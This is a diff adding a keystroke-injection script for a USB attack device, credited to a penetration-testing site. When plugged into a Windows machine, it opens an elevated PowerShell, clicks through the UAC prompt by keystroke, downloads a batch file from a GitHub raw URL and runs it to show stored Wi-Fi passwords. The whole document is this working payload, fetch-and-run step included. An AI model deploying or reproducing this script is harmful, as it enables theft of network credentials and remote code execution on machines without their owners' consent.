@@ -1,0 +1,33 @@
+REM ------------------------------------------------------------------------------------------------------
+REM                                        PowerShell Edition
+REM  The script automates the process of downloading and executing a batch 
+REM  file that retrieves Wi-Fi passwords stored on the system. It runs in the 
+REM  currently logged-in Windows profile and displays the retrieved passwords 
+REM  on the screen. The script uses keystrokes to run the necessary commands
+REM  and visually indicates progress with LED color changes.
+REM Pentestit.de - Frank Neugebauer (2025-03-25)
+REM Currently supported layouts: DE, GB, US, ES, FR, DK, RU
+REM Change language in the first line
+REM -----------------------------------------------------------------------------------------------------
+LOCALE DE
+DEFAULTDELAY 2000
+REM LED off
+LED 0 0 0
+REM LED red
+LED 255 0 0
+REM Run PowerShell as Administrator
+GUI r
+REM LED blue
+LED 0 0 255
+STRING powershell Start-Process powershell -Verb runAS
+ENTER
+TAB
+TAB
+TAB
+ENTER
+STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/eaglefn/malduinow/refs/heads/main/wifi_key_grabber.bat" -OutFile "wifi.bat"
+ENTER
+STRING Start-Process -FilePath "wifi.bat"
+ENTER
+REM LED green
+LED 0 255 0
